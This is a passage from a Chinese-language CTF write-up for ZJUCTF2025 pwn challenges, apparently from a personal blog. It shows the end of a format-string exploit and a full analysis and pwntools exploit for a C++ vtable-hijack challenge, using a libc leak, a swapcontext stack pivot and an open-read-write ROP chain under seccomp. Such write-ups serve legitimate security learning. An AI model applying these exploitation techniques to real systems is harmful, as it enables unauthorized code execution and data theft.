class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    place = offset_3</span><br><span class="line">    target_byte = (target_addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    target_byte = (<span class="number">0x100</span> - <span class="built_in">len</span>(<span class="string">"&gt; unknown cmd: "</span>)) + target_byte</span><br><span class="line">    payload = <span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>(target_byte, place).encode()</span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    payload += p64(ptr_2_ret + i)</span><br><span class="line">    s(payload)</span><br><span class="line">    r()</span><br><span class="line">    </span><br><span class="line">ptr_2_rbp = ptr_2_ret - <span class="number">0x8</span></span><br><span class="line">target_addr = elf_base + <span class="number">0x5020</span> + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    place = offset_3</span><br><span class="line">    target_byte = (target_addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    target_byte = (<span class="number">0x100</span> - <span class="built_in">len</span>(<span class="string">"&gt; unknown cmd: "</span>)) + target_byte</span><br><span class="line">    payload = <span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>(target_byte, place).encode()</span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    payload += p64(ptr_2_rbp + i)</span><br><span class="line">    s(payload)</span><br><span class="line">    r()   </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b"q"</span>)</span><br><span class="line">r()</span><br><span class="line">sl(<span class="string">b"y"</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
<p>需要注意的有这么几点：</p>
<ul>
<li>我们是控制main函数返回地址到one_gadget，但这个libc2.31下main函数栈帧<code>old rbp</code>是0，所以我们得先把<code>old_rbp</code>改成一个可读可写的地址，这里选择elf程序的bss段+0x100</li>
<li>printf的字符串不止有我们输入的payload，还有他程序snprintf进去的&gt; unknown cmd:，所以在执行写入的时候应该把这几个字符减掉</li>
</ul>
<p>剩下就是正常的泄露三元素（elf地址，栈地址，libc地址）然后让程序结束main函数跳转到<code>one_gadget</code>了</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125224932282.png"></p>
<p>flag：<code>flag{2o48_1s_E4sy_T0_pvvN-&amp;-9MIbwamf}</code></p>
<h3 id="breakup">5 breakup</h3>
<p>c++也成easy了吗...</p>
<p>题目给了源代码，先看一下源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//g++ -o vuln main.cpp -std=c++17 -no-pie -z now -s</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span> {</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span> {</span><br><span class="line">        {<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>},</span><br><span class="line">        {<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>},</span><br><span class="line">        {<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>},</span><br><span class="line">        {<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>},</span><br><span class="line">        {<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>},</span><br><span class="line">        {<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>},</span><br><span class="line">        {<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>},</span><br><span class="line">        {<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>}</span><br><span class="line">    };</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> { <span class="number">8</span>, sfi };</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomorin</span> {</span></span><br><span class="line">public:</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    virtual ~Tomorin() {</span><br><span class="line">        <span class="comment">//no flag desuwa</span></span><br><span class="line">    }</span><br><span class="line">    <span class="type">void</span> <span class="title function_">meet</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *n)</span> {</span><br><span class="line">        name = n;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">void</span> <span class="title function_">band</span><span class="params">()</span> {</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please play band with me together,"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="built_in">cout</span>.setf(ios::unitbuf);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Ohayo,I'm Takamatsu Tomori,what's your name?"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">string</span> gugugaga;</span><br><span class="line">    getline(<span class="built_in">cin</span>, gugugaga);</span><br><span class="line">    <span class="keyword">auto</span> h = new Tomorin();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"I didn't catch it, can you say it again?"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span>.getline(buf, <span class="number">0x200</span>);</span><br><span class="line">    h-&gt;meet(buf);</span><br><span class="line">    h-&gt;band();</span><br><span class="line">    delete[] h;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>看下沙箱：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-<span class="number">1</span>THOKMAC:/home/wingee/ZJUCTF2025/Pwn/breakup# seccomp-tools dump ./breakup</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000004</span>  <span class="keyword">A</span> = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x05 <span class="number">0</span>xc000003e  if (<span class="keyword">A</span> != ARCH_X86_64) goto <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  <span class="keyword">A</span> = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35 0x00</span> <span class="number">0</span>x01 <span class="number">0x40000000</span>  if (<span class="keyword">A</span> &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x02 <span class="number">0</span>xffffffff  if (<span class="keyword">A</span> != <span class="number">0</span>xffffffff) goto <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15 0x01</span> <span class="number">0</span>x00 <span class="number">0</span>x0000003b  if (<span class="keyword">A</span> == execve) goto <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0</span>x7fff0000  return ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br></pre></td></tr></table></figure>
<p>看下libc版本：</p>
<figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-<span class="number">1</span>THOKMAC:/home/wingee/ZJUCTF2025/Pwn/breakup# ./libc.so.<span class="number">6</span></span><br><span class="line">GNU C Library (Ubuntu GLIBC <span class="number">2.39</span>-<span class="number">0</span>ubuntu8.<span class="number">6</span>) <span class="meta">stable</span> release version <span class="number">2.39</span>.</span><br><span class="line">Copyright (C) <span class="number">2024</span> Free Software Foundation, Inc.</span><br><span class="line">This <span class="keyword">is</span> free software; see the source for copying conditions.</span><br><span class="line">There <span class="keyword">is</span> NO warranty; <span class="built_in">not</span> even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version <span class="number">13.3</span>.<span class="number">0</span>.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">Minimum supported kernel: <span class="number">3.2</span>.<span class="number">0</span></span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>（题目原本的libc是坏掉的，应该是只给了个软链接，这里的libc是从出题人给的Dockerfile的docker里拉出来的）</p>
<p>在题目里面可以看到有这么两句话</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete[] h<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>问了一下AI，AI说这是把h当做一个对象数组去free了。试着运行了一下程序，结果总是崩溃（意料之中）</p>
<p>动调一下看看这个delete到底在干什么：</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125225651954.png"></p>
<p>可以看到在delete的时候实际上是在循环执行这四条指令，了解了一下c++的对象内存构造之后推测这四句话其实是这个意思：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    |<span class="string">   ....</span></span><br><span class="line"><span class="string">----------------- &lt;---- Object_Ptr    ---------------</span></span><br><span class="line"><span class="string">    </span>|<span class="string">   vtable  </span>|<span class="string">  -----------------&gt; </span>|<span class="string"> ~Object()ptr</span>|<span class="string"> </span></span><br><span class="line"><span class="string">    -------------                     ---------------</span></span><br><span class="line"><span class="string">0x28</span>|<span class="string">   nameptr </span>|<span class="string">                     </span>|<span class="string">     .....   </span>|</span><br><span class="line">    -------------</span><br><span class="line">    |<span class="string">    ....   </span>|</span><br><span class="line">----------------- </span><br><span class="line">    |<span class="string">   vtable  </span>|</span><br></pre></td></tr></table></figure>
<p>他去把h当做了一个存储对象的向量去free，在c++里，向量也会被以堆块的形式分配到内存里：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">  size  </span>|<span class="string">  obj1 </span>|<span class="string"> obj2 </span>|<span class="string"> .... </span>|</span><br></pre></td></tr></table></figure>
<p>首先，delete会去找这个数组的size，数组的size就表示他当前存储了多少个这样的对象，在这之后delete会从后向前释放对象</p>
<p>具体流程为：</p>
<ul>
<li>从向量中找到这个对象的起始地址 <code>sub rbx, 0x28</code></li>
<li>找到该对象所对应类的虚表指针 <code>mov rax, qword ptr [rbx]</code></li>
<li>找到该对象所对应类的虚表中的该类的析构函数指针 <code>mov rax, qword ptr [rax]</code></li>
<li>将当前对象的指针（地址）当做参数 <code>mov rdi, rbx</code></li>
<li>调用析构函数 <code>call rax</code></li>
</ul>
<p><strong>该流程会循环，即把虚表里面的每个函数都轮番调用一遍。</strong></p>
<p>也就是说，如果我们能够控制<code>delete []h</code>的时候，delete所操作的第一个（实际上是h向量的最后一个对象）对象的虚表，就可以调用任何函数</p>
<p>可以看到这里有两次地址翻译，所以我们要找一块区域去构造虚表，看到程序有一个buf[0x200]我们可以进行输入并且程序没有开启pie，所以我们可以将buf构造成伪造得到虚表。</p>
<p>目前的问题是如何在h向量最后一个对象地址处构造东西，动调看一下这个地址是多少：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x401554</span>    <span class="keyword">sub</span>    <span class="built_in">rbx</span>, <span class="number">0x28</span>                <span class="built_in">RBX</span> =&gt; <span class="number">0xb498250</span> (<span class="number">0xb498278</span> - <span class="number">0x28</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125231135529.png"></p>
<p>该指针位于高地址处，看看我们有没有可以分配堆块的手段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> gugugaga;</span><br><span class="line">getline(<span class="built_in">cin</span>, gugugaga);</span><br></pre></td></tr></table></figure>
<p>在程序中我们可以预先输入一个字符串，在C++里string也是对象，也会分配在堆上，并且这里没有控制输入的大小，也就是我们可以分配一个极大堆块分配到我们想分配的地址处。在不断地尝试下发现分配一个0x800堆块的时候刚好可以构造到</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125231704250.png"></p>
<p>可以看到莫名其妙多了一堆tcache的堆块，这是因为C++在分配字符串对象的堆块的时候它一开始也不知道要分配多大的，所以就一边接受字符一边看情况，如果接受的字符数量过多<strong>会调用类似realloc的东西将当前堆块free掉并且分配一个大的</strong>，就这样这里出现了一堆tcache的堆块，我们要构造的地址也在这些已free的tcache的地址区间，但无所谓，我们的payload已经写进去了，这些已free的堆块的内容并不会清空</p>
<p>通过精心构造之后，我们将虚表指针设置为buffer，buffer第一个元素写为我们想要让程序执行的函数就能控制执行流。</p>
<p>目前问题是如何泄露<code>libc</code>，看到该对象中有这么一个函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void <span class="function"><span class="title">band</span></span>() {</span><br><span class="line">    cout &lt;&lt; <span class="string">"Please play band with me together,"</span> &lt;&lt; <span class="string">endl;</span></span><br><span class="line"><span class="string">    cout &lt;&lt; name &lt;&lt; endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>这个<code>name</code>在对象的内存构造中是一个紧挨着<code>vtable</code>指针的字符串指针，我们在构造的时候就可以将虚表第一项设置为band，将name指针设置为GOT</p>
<p>调用完band之后就可以泄露libc，我们将虚表第二项设置为这个地址：0x4014B8</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125232701993.png"></p>
<p>因为虚表指针我们已经设置在对应的位置了，我们现在只需要继续修改虚表的内容就可以了，也就是改<code>buf</code>，那就跳到改<code>buf</code>之前的段落就好了</p>
<p>之后就是libc 2.39+沙箱的一套通用打法</p>
<ul>
<li>将虚表第一项设置为<code>svcudp_reply+29</code> 使用<code>svcupe</code>中的<code>magic gadget</code>进行一波寄存器的调整</li>
<li>将虚表第二项设置为<code>swapcontext+157</code>设置寄存器，主要是设置rsp进行栈迁移</li>
<li>在<code>buf + 0x100</code>位置处布置伪造的<code>context</code></li>
<li>在<code>buf + 0x20</code>位置处布置伪造的栈，<code>libc 2.39</code>里找不到<code>pop rdx; ret</code> 但可以找到这样一段话</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">11b74f</span>:	<span class="number">48</span> <span class="number">89</span> f2             	mov    %rsi,%rdx</span><br><span class="line"><span class="attribute">11b752</span>:	<span class="number">31</span> f6                	xor    %esi,%esi</span><br><span class="line"><span class="attribute">11b754</span>:	<span class="number">0</span>f <span class="number">05</span>                	syscall </span><br><span class="line"><span class="attribute">11b756</span>:	<span class="number">3</span>d <span class="number">00</span> f0 ff ff       	cmp    $<span class="number">0</span>xfffff000,%eax</span><br><span class="line"><span class="attribute">11b75b</span>:	<span class="number">76</span> <span class="number">1</span>b                	jbe    <span class="number">11</span>b778 &lt;posix_fallocate@@GLIBC_2.<span class="number">2</span>.<span class="number">5</span>+<span class="number">0</span>x38&gt;</span><br><span class="line"><span class="attribute">11b75d</span>:	<span class="number">83</span> f8 a1             	cmp    $<span class="number">0</span>xffffffa1,%eax</span><br><span class="line"><span class="attribute">11b760</span>:	<span class="number">74</span> <span class="number">06</span>                	je     <span class="number">11</span>b768 &lt;posix_fallocate@@GLIBC_2.<span class="number">2</span>.<span class="number">5</span>+<span class="number">0</span>x28&gt;</span><br><span class="line"><span class="attribute">11b762</span>:	f7 d8                	neg    %eax</span><br><span class="line"><span class="attribute">11b764</span>:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>可以把<code>rsi</code>给<code>rdx</code>，还能直接调用<code>syscall</code>，但一开始有个小问题，这里把<code>rdx</code>设置好之后会把<code>rsi</code>清空，之后调用<code>syscall</code>不就炸了？</p>
<p>但后来调试发现一点都不影响，<code>syscall</code>炸了程序并不会崩溃，而且这段<code>gadget</code>总会<code>ret</code>，所以我们使用这段<code>gadget</code>的时候就不必关心<code>syscall</code>的问题，全当做设置<code>rdx</code>的代码来使用就好了~</p>
<p>布置的栈就是一个常规的<code>orw</code>，本题exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># p = websocket("wss://ctf.zjusec.com/api/proxy/b6f35f6f-1de3-45d7-a19f-dd1955ef8713")</span></span><br><span class="line"><span class="comment"># p = remote("0.0.0.0", 8008)</span></span><br><span class="line">p = process(<span class="string">"./vuln"</span>)</span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./breakup"</span>)</span><br><span class="line"><span class="comment"># main = 0x40140D</span></span><br><span class="line">band = <span class="number">0x401706</span></span><br><span class="line"></span><br><span class="line">buffer_addr = <span class="number">0x404280</span></span><br><span class="line">start = <span class="number">0x401230</span></span><br><span class="line">return_addr = <span class="number">0x4014B8</span></span><br><span class="line"><span class="comment"># for i in range(0x800 // 8):</span></span><br><span class="line"><span class="comment">#     payload += p64(buffer_addr)</span></span><br><span class="line"></span><br><span class="line">idx1 = <span class="number">0x70</span></span><br><span class="line">idx2 = idx1 - (<span class="number">0x28</span> // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">idx3 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">idx4 = idx1 + (<span class="number">0x28</span> + <span class="number">0x48</span> - <span class="number">0x50</span>) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x583f3</span>, <span class="number">0x1111da</span>, <span class="number">0x1111e2</span>, <span class="number">0x1111e7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x800</span> // <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i == idx1:</span><br><span class="line">        payload += p64(buffer_addr)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> i == idx1 + <span class="number">1</span>:</span><br><span class="line">        payload += p64(<span class="number">0x403FB0</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">0xa</span>:</span><br><span class="line">        payload += p64(<span class="number">0xdeadbeaf</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> i == idx2:</span><br><span class="line">        payload += p64(buffer_addr + <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> i == idx4:</span><br><span class="line">        payload += p64(buffer_addr + <span class="number">0x100</span>)</span><br><span class="line">    payload += p64(i)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"Ohayo,I'm Takamatsu Tomori,what's your name?"</span>, payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(band) + p64(return_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1ff</span>, <span class="string">b"\xAA"</span>)</span><br><span class="line">sla(<span class="string">b"I didn't catch it, can you say it again?"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"Please play band with me together,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"Please play band with me together,"</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">response = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">"leak =&gt; "</span> + <span class="built_in">hex</span>(response))</span><br><span class="line">libc_base = response - (<span class="number">0x7f9963b4a870</span> - <span class="number">0x00007f99637a2000</span>)</span><br><span class="line">success(<span class="string">"libc_base =&gt; "</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">swapcontext = libc_base + <span class="number">0x5815d</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x7fda6bd87870</span> - <span class="number">0x00007fda6ba07800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(setcontext)</span></span><br><span class="line"></span><br><span class="line">mov_rdx = <span class="number">0x17926d</span> + libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(mov_rdx))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x010f78b</span></span><br><span class="line">pop_rsi_15 = libc_base + <span class="number">0x010f789</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x8d6a</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00dd237</span></span><br><span class="line">ret_gadget = pop_rdi + <span class="number">1</span></span><br><span class="line">payload = p64(band) + p64(mov_rdx)</span><br><span class="line"></span><br><span class="line">set_rdx_syscall = libc_base + <span class="number">0x11b74f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(buffer_addr + <span class="number">0x1d0</span>)  + p64(pop_rsi_15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libc_base + <span class="number">0x11b150</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">"open"</span>]))</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_15) + p64(buffer_addr + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">0</span>) + p64(set_rdx_syscall) <span class="comment"># rdx set</span></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_15) + p64(buffer_addr + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">0</span>) + p64(set_rdx_syscall + <span class="number">5</span>) <span class="comment"># syscall</span></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_15) + p64(buffer_addr + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + 